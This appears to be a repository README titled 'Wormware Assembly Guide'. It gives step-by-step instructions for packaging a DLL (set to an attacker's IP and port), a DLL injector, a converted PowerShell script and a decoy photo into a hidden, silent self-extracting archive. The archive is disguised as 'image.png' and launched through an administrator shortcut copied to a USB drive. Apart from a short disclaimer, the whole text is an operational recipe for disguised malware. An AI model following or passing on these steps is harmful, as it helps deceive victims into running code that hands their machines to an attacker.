# Wormware Assembly Guide

This repository contains the following five files that, when combined, function as a wormware:

1. `REVDll.dll`
2. `REVDlls.dll`
3. `REVDllInjector.exe`
4. `deneme.ps1`
5. `maas.jpg`

## Preparation Steps

### Step 1: Update IP and Port in `REVDll.dll`
Modify the IP address and port in the `REVDll.dll` file to match your requirements.

### Step 2: Convert `deneme.ps1` to Executable
Convert the `deneme.ps1` PowerShell script into an executable (`.exe`) file using a suitable tool.

### Step 3: Collect Files
Move the following files into the same directory:
- `REVDll.dll`
- `REVDlls.dll`
- `REVDllInjector.exe`
- `deneme.exe` (converted from `deneme.ps1`)
- `maas.jpg`

### Step 4: Create an SFX Archive
1. Select all the files in the directory.
2. Right-click and choose **Add to Archive**.
3. Click **Create SFX Archive** in the archive options.
4. Open the **Advanced** tab and click **SFX Options**.
5. In the **Update** tab, select **Overwrite all files**.
6. In the **Modes** tab, select **Unpack to temporary folder** and **Hide all**.
7. In the **Setup** tab, enter the following in sequence:
   - First line: `maas.jpg`
   - Second line: `deneme.exe`
   - Third line: `REVDllInjector.exe`
8. Click **OK** to save the SFX archive.

### Step 5: Rename the SFX Archive
Rename the resulting SFX archive to `image.png`.

### Step 6: Create a Shortcut
1. Create a shortcut for the SFX archive.
2. Set the **Target** field to:
   ```
   C:\Windows\System32\cmd.exe /c start /b E:\image.png
   ```
   Adjust the path to `image.png` if it is stored in a different directory.
3. Open the shortcut's advanced properties and enable **Run as administrator**.

### Step 7: Final Adjustments
- Set the `image.png` file to **hidden**.
- The wormware is now ready.

## Usage
Copy the files, including the shortcut, to a USB drive for testing in secure environments or to incorporate into penetration testing workflows. Ensure you use this responsibly and in compliance with applicable laws and ethical guidelines.

---

**Disclaimer:** This project is intended for educational and ethical penetration testing purposes only. Unauthorized use of this tool is strictly prohibited and may result in severe legal consequences.

